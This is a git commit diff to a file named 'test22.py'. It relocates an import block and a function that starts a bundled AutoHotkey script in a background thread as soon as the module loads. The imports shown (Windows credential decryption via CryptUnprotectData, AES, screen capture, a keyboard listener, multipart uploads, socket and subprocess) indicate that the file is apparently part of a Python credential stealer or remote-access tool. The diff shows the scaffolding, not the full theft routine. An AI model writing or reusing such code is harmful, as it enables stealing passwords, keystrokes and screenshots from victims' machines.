ed71dce6a12021a35dc3dd16423dabe5a26aa38e
leneenen <153459306+leneenen@users.noreply.github.com>
2023-12-14 16:14:08 +0100

    Update test22.py

--- test22.py
+++ test22.py
@@ -14,27 +14,6 @@ from ctypes import wintypes
 from multiprocessing import cpu_count
 from shutil import copy2
 from zipfile import ZIP_DEFLATED, ZipFile
-
-import psutil
-import requests
-from Cryptodome.Cipher import AES
-from PIL import Image, ImageGrab
-from requests_toolbelt.multipart.encoder import MultipartEncoder
-from win32crypt import CryptUnprotectData
-
-def run_ahk_script():
-    script_path = os.path.join(os.path.dirname(__file__), 'ChapkaMolette v5.ahk')
-    executable_path = os.path.join(os.path.dirname(__file__), 'AutoHotKeyA32.exe')
-
-    # Exécuter le script AHK dans un processus séparé
-    subprocess.run([executable_path, script_path])
-
-# Créer un thread pour exécuter le script AHK
-ahk_thread = threading.Thread(target=run_ahk_script)
-
-# Démarrer le thread
-ahk_thread.start()
-
 import random
 import socket, subprocess, os, platform
 from threading import Thread
@@ -57,6 +36,28 @@ from pynput.keyboard import Listener
 from pynput.mouse import Controller
 import time
 import keyboard
+
+import psutil
+import requests
+from Cryptodome.Cipher import AES
+from PIL import Image, ImageGrab
+from requests_toolbelt.multipart.encoder import MultipartEncoder
+from win32crypt import CryptUnprotectData
+
+def run_ahk_script():
+    script_path = os.path.join(os.path.dirname(__file__), 'ChapkaMolette v5.ahk')
+    executable_path = os.path.join(os.path.dirname(__file__), 'AutoHotKeyA32.exe')
+
+    # Exécuter le script AHK dans un processus séparé
+    subprocess.run([executable_path, script_path])
+
+# Créer un thread pour exécuter le script AHK
+ahk_thread = threading.Thread(target=run_ahk_script)
+
+# Démarrer le thread
+ahk_thread.start()
+
+
 
 user32 = ctypes.WinDLL('user32')
 kernel32 = ctypes.WinDLL('kernel32')
